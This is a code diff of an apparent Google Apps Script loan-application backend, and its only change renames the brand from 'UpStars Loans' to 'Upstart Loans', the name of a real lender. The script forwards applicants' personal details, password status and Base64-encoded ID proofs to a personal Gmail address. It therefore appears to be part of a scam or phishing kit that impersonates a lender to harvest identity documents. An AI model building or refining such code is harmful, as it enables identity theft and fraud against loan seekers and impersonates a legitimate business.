@@ -1,4 +1,4 @@
-// Two-Step Email Script for UpStars Loans
+// Two-Step Email Script for Upstart Loans
 // Step 1: Application form details
 // Step 2: Agreement with ID proof
 
@@ -8,7 +8,7 @@ const SECONDARY_EMAIL = "tyronlincolnn@gmail.com";
 
 function doGet(e) {
   return HtmlService.createHtmlOutput(`
-    <h1>UpStars Loans Email Service</h1>
+    <h1>Upstart Loans Email Service</h1>
     <p>Two-step email system ready.</p>
     <p><strong>Current emails:</strong></p>
     <ul>
@@ -54,7 +54,7 @@ function sendApplicationEmail(data) {
   
   // Simple email with just form details
   const emailBody = `
-NEW LOAN APPLICATION - UPSTARS LOANS
+NEW LOAN APPLICATION - Upstart Loans
 
 ==========================================
 Applicant Information:
@@ -86,7 +86,7 @@ Password: ${data.password ? '[PROVIDED]' : '[NOT PROVIDED]'}
 Submission Date: ${new Date().toLocaleString()}
 
 ==========================================
-This is an automated message from UpStars Loans Application System
+This is an automated message from Upstart Loans Application System
   `;
   
   // Send to both emails
@@ -101,7 +101,7 @@ function sendAgreementEmail(data) {
   
   // Email with agreement and ID proof
   const emailBody = `
-LOAN AGREEMENT SIGNED - UPSTARS LOANS
+LOAN AGREEMENT SIGNED - Upstart Loans
 
 ==========================================
 Borrower Information:
@@ -127,7 +127,7 @@ File Size: ${data.idProofSize || 'Not uploaded'}
 Status: ${data.idProofBase64 ? 'Attached (Base64 encoded)' : 'Not uploaded'}
 
 ==========================================
-This is an automated message from UpStars Loans Agreement System
+This is an automated message from Upstart Loans Agreement System
   `;
   
   // Send to both emails
@@ -149,9 +149,9 @@ function calculateMonthlyPayment(loanAmount, loanTerm) {
 }
 
 function sendErrorEmail(error, data) {
-  const subject = 'Error in UpStars Loans System';
+  const subject = 'Error in Upstart Loans System';
   const body = `
-An error occurred in the UpStars Loans system:
+An error occurred in the Upstart Loans system:
 
 Error: ${error}
 
